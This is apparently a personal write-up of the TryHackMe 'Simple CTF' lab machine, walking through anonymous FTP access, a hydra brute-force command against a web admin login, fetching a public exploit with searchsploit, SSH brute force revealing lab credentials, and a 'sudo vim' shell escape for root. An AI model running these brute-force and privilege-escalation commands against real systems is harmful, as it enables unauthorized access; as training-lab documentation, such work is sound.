Machine: THM - Simple CTF

# Initial Foothold

## FTP

FTP anonymous login.
Download file "ForMitch.txt":
```txt
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```
=> New username: mitch
=> Password reuse for root?

## HTTP

Dirbuster dir brute force.
=> http://10.10.118.197/simple/admin/login.php

Brute login with hydra:
```bash
hydra -l mitch -P /usr/share/wordlists/rockyou.txt 10.10.118.197 http-post-form \
"/simple/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:F=incorrect"
```

Success:
![[Pasted image 20240427123047.png]]

Download exploit:
```bash
searchsploit -m 48779
```
Run exploit:
![[Pasted image 20240427123446.png]]
Catch shell:
![[Pasted image 20240427123514.png]]
## SSH

Brute-force *mitch* SSH login: 
![[Pasted image 20240427121137.png]]
=> secret

**SSH creds:**
mitch:secret

![[Pasted image 20240427121338.png]]

Proof:
![[Pasted image 20240427121858.png]]

# PrivEsc

Check sudo privs:
![[Pasted image 20240427121500.png]]

Exploit sudo vim:
https://gtfobins.github.io/gtfobins/vim/

```bash
sudo vim -c ':!/bin/sh'
```

![[Pasted image 20240427121747.png]]

Proof:
![[Pasted image 20240427121817.png]]